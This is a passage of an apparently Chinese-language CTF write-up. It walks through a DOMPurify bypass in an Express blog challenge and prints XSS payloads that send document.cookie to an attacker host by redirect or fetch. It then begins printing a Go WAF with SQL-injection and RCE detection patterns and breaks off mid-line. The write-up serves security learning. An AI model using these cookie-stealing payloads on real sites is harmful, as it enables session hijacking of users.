class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> express <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;express&#x27;</span>;<br><span class="hljs-keyword">import</span> session <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;express-session&#x27;</span>;<br><span class="hljs-keyword">import</span> rateLimit <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;express-rate-limit&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; randomBytes &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;crypto&#x27;</span>;<br><span class="hljs-keyword">import</span> createDOMPurify <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;dompurify&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; <span class="hljs-variable constant_">JSDOM</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;jsdom&#x27;</span>;<br><br><span class="hljs-keyword">const</span> &#123; <span class="hljs-variable language_">window</span> &#125; = <span class="hljs-keyword">new</span> <span class="hljs-title function_">JSDOM</span>();<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">DOMPurify</span> = <span class="hljs-title function_">createDOMPurify</span>(<span class="hljs-variable language_">window</span>);<br><br><span class="hljs-keyword">const</span> posts = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DEFAULT_LAYOUT</span> = <span class="hljs-string">`</span><br><span class="hljs-string">&lt;article&gt;</span><br><span class="hljs-string">  &lt;h1&gt;Blog Post&lt;/h1&gt;</span><br><span class="hljs-string">  &lt;div&gt;&#123;&#123;content&#125;&#125;&lt;/div&gt;</span><br><span class="hljs-string">&lt;/article&gt;</span><br><span class="hljs-string">`</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">LENGTH_LIMIT</span> = <span class="hljs-number">500</span>;<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">&#x27;production&#x27;</span>) &#123;<br>  app.<span class="hljs-title function_">use</span>(<br>    <span class="hljs-string">&#x27;/api&#x27;</span>,<br>    <span class="hljs-title function_">rateLimit</span>(&#123;<br>      <span class="hljs-attr">windowMs</span>: <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>,<br>      <span class="hljs-attr">max</span>: <span class="hljs-number">10</span>,<br>    &#125;),<br>  );<br>&#125;<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">session</span>(&#123;<br>  <span class="hljs-attr">secret</span>: <span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">32</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>),<br>  <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,<br>  <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">false</span>,<br>&#125;));<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, _, next</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>) &#123;<br>    req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span> = [<span class="hljs-variable constant_">DEFAULT_LAYOUT</span>];<br>    req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span> = [];<br>  &#125;<br>  <span class="hljs-title function_">next</span>();<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;Cache-Control&#x27;</span>, <span class="hljs-string">&#x27;no-store&#x27;</span>);<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;home&#x27;</span>, &#123;<br>    <span class="hljs-attr">posts</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span>,<br>    <span class="hljs-attr">maxLayout</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>,<br>  &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/post&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; content, layoutId &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> content !== <span class="hljs-string">&#x27;string&#x27;</span> || <span class="hljs-keyword">typeof</span> layoutId !== <span class="hljs-string">&#x27;number&#x27;</span>) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid params&#x27;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (content.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Content too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> layout = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>[layoutId];<br>  <span class="hljs-keyword">if</span> (layout === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout not found&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedContent = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(content, &#123;<br>    <span class="hljs-attr">ALLOWED_ATTR</span>: [],<br>    <span class="hljs-attr">ALLOW_ARIA_ATTR</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">ALLOW_DATA_ATTR</span>: <span class="hljs-literal">false</span>,<br>  &#125;);<br>  <span class="hljs-keyword">const</span> body = layout.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\&#123;\&#123;content\&#125;\&#125;/g</span>, <span class="hljs-function">() =&gt;</span> sanitizedContent);<br><br>  <span class="hljs-keyword">if</span> (body.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Post too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> id = <span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>  posts.<span class="hljs-title function_">set</span>(id, body);<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span>.<span class="hljs-title function_">push</span>(id);<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Post <span class="hljs-subst">$&#123;id&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(layout).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(sanitizedContent).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span>`</span>);<br><br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/layout&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; layout &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> layout !== <span class="hljs-string">&#x27;string&#x27;</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid param&#x27;</span>);<br>  <span class="hljs-keyword">if</span> (layout.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout too large&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedLayout = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(layout, &#123;<br>    <span class="hljs-attr">ALLOWED_ATTR</span>: [],<br>    <span class="hljs-attr">ALLOW_ARIA_ATTR</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">ALLOW_DATA_ATTR</span>: <span class="hljs-literal">false</span>,<br>  &#125;);<br><br>  <span class="hljs-keyword">const</span> id = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-property">length</span>;<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-title function_">push</span>(sanitizedLayout);<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/post/:id&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; id &#125; = req.<span class="hljs-property">params</span>;<br>  <span class="hljs-keyword">const</span> body = posts.<span class="hljs-title function_">get</span>(id);<br>  <span class="hljs-keyword">if</span> (body === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Post not found&#x27;</span>);<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;post&#x27;</span>, &#123; id, body &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/clear&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span> = [<span class="hljs-variable constant_">DEFAULT_LAYOUT</span>];<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span> = [];<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;cleared&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Web server running on port 3000&#x27;</span>);<br>&#125;);<br><br></code></pre></td></tr></table></figure><p>主要看这里</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/post&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; content, layoutId &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> content !== <span class="hljs-string">&#x27;string&#x27;</span> || <span class="hljs-keyword">typeof</span> layoutId !== <span class="hljs-string">&#x27;number&#x27;</span>) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid params&#x27;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (content.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Content too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> layout = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>[layoutId];<br>  <span class="hljs-keyword">if</span> (layout === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout not found&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedContent = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(content, &#123;<br>    <span class="hljs-attr">ALLOWED_ATTR</span>: [],<br>    <span class="hljs-attr">ALLOW_ARIA_ATTR</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">ALLOW_DATA_ATTR</span>: <span class="hljs-literal">false</span>,<br>  &#125;);<br>  <span class="hljs-keyword">const</span> body = layout.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\&#123;\&#123;content\&#125;\&#125;/g</span>, <span class="hljs-function">() =&gt;</span> sanitizedContent);<br><br>  <span class="hljs-keyword">if</span> (body.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Post too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> id = <span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>  posts.<span class="hljs-title function_">set</span>(id, body);<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span>.<span class="hljs-title function_">push</span>(id);<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Post <span class="hljs-subst">$&#123;id&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(layout).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(sanitizedContent).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span>`</span>);<br><br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/layout&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; layout &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> layout !== <span class="hljs-string">&#x27;string&#x27;</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid param&#x27;</span>);<br>  <span class="hljs-keyword">if</span> (layout.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout too large&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedLayout = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(layout, &#123;<br>    <span class="hljs-attr">ALLOWED_ATTR</span>: [],<br>    <span class="hljs-attr">ALLOW_ARIA_ATTR</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">ALLOW_DATA_ATTR</span>: <span class="hljs-literal">false</span>,<br>  &#125;);<br><br>  <span class="hljs-keyword">const</span> id = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-property">length</span>;<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-title function_">push</span>(sanitizedLayout);<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>不仅过滤了<code>ALLOWED_ATTR: [],</code>还过滤了<code>ALLOW_ARIA_ATTR: false, ALLOW_DATA_ATTR: false,</code>那<code>aria</code> 和 <code>data</code>也用不了了</p><p>我们需要在不使用属性的情况下插入一个恶意标签。通常，恶意标签要么会被移除，要么会被转义，但我们可以在 <code>&lt;style&gt;</code> 中插入未被转义的尖括号。</p><p>DOMPurify 非常严格，会过滤掉 <code>&lt;style&gt;</code> 中的任何 HTML 标签。然而，正则表达式只检查 <code>/&lt;[/\w]/</code>，所以 <code>&lt;&#123;&#123;content&#125;&#125;</code> 不会被过滤，并且可以用来插入恶意标签</p><p>1.CVE-2023-48219</p><p>替换<code>&#123;&#123;content&#125;&#125;</code>为空来逃脱</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><br>&#123; <span class="hljs-string">&quot;layout&quot;</span>: <span class="hljs-string">&quot;s&lt;style&gt;&lt;&#123;&#123;content&#125;&#125;/style&gt;&lt;&#123;&#123;content&#125;&#125;script&gt;location.href=&quot;</span><span class="hljs-attr">http</span>:<span class="hljs-comment">//xxx.xxx.xxx.xxx:xxxx?flag=&quot;+document.cookie;&lt;&#123;&#123;content&#125;&#125;/script&gt;test&lt;/style&gt;&quot; &#125;</span><br><br>&#123; <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;layoutId&quot;</span>: <span class="hljs-number">2</span> &#125;<br></code></pre></td></tr></table></figure><p>第一个<code>&#123;&#123;content&#125;&#125;</code>用来闭合<code>style</code>标签,第二个<code>&#123;&#123;content&#125;&#125;</code>用来创建<code>script</code>标签</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312123632707.png" alt="image-20250312123632707"></p><p>成功跳转</p><p>2.构造恶意xss</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">logout： a&lt;style&gt;&#123;&#123;content&#125;&#125;&lt;&#123;&#123;content&#125;&#125;&lt;/style&gt;<br><br>content： img src onerror=<span class="hljs-title function_">fetch</span>(<span class="hljs-string">`&#123;YOUR_URL&#125;/`</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>) &lt;style&gt;&lt;/style&gt;<br></code></pre></td></tr></table></figure><p>来使用<code>fetch</code>也可以，都是利用非恶意标签<code>&lt;style&gt;</code>来构造<code>xss</code></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312202007357.png" alt="image-20250312202007357"></p><h2 id="Are-you-incognito"><a href="#Are-you-incognito" class="headerlink" title="Are you incognito?"></a>Are you incognito?</h2><p><a href="https://ouuan.moe/post/2025/03/tpctf-2025#are-you-incognito-3-solves">解法1</a></p><p>他们说是0day，我不到啊，0day拿来出题吗😭😅</p><p>复现不明白可还行😅</p><h2 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h2><p>源码：<br>waf函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;bytes&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br><span class="hljs-string">&quot;mime&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br><span class="hljs-string">&quot;regexp&quot;</span><br><span class="hljs-string">&quot;strings&quot;</span><br>)<br><br><span class="hljs-keyword">const</span> backendURL = <span class="hljs-string">&quot;http://127.0.0.1:8000&quot;</span><br><span class="hljs-keyword">const</span> backendHost = <span class="hljs-string">&quot;127.0.0.1:8000&quot;</span><br><br><span class="hljs-keyword">var</span> blockedIPs = <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>&#123;<br><span class="hljs-string">&quot;1.1.1.1&quot;</span>: <span class="hljs-literal">true</span>,<br>&#125;<br><br><span class="hljs-keyword">var</span> sqlInjectionPattern = regexp.MustCompile(<span class="hljs-string">`(?i)(union.*select|select.*from|insert.*into|update.*set|delete.*from|drop\s+table|--|#|\*\/|\/\*)`</span>)<br><br><span class="hljs-keyword">var</span> rcePattern = regexp.MustCompile(<span class="hljs-string">`(?i)(\b(?:os|exec|system|eval|passthru|shell_exec|phpinfo|popen|proc_open|pcntl_exec|assert)\s*\(.+\))`</span>)<br><br><span class="hljs-keyword">var</span> hotfixPattern = regexp.MustCompile(<span class="hljs-string">`(?i)(select)`</span>)<br><br><span class="hljs-keyword">var</span> blockedUserAgents = []<span class="hljs-type">string</span>&#123;<br><span class="hljs-string">&quot;sqlmap&quot;</span>,<br><span class="hljs-string">&quot;nmap&quot;</span>,<br><span class="hljs-string">&quot;curl&quot;</span>,<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">isBlockedIP</span><span class="hljs-params">(ip <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">return</span> blockedIPs[ip]<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">isMaliciousRequest</span><span class="hljs-params">(r *http.Request)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">for</span> key, values := <span class="hljs-keyword">range</span> r.URL.Query() &#123;<br><span class="hljs-keyword">for</span> _, value := <span class="hljs-keyword">range</span> values &#123;<br><span class="hljs-keyword">if</span> sqlInjectionPattern.MatchString(value) &#123;<br>log.Printf(<span class="hljs-string">&quot;阻止 SQL 注入: 参数 %s=%s&quot;</span>, key, value)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-keyword">if</span> rcePattern.MatchString(value) &#123;<br>log.Printf(<span class="hljs-string">&quot;阻止 RCE 攻击: 参数 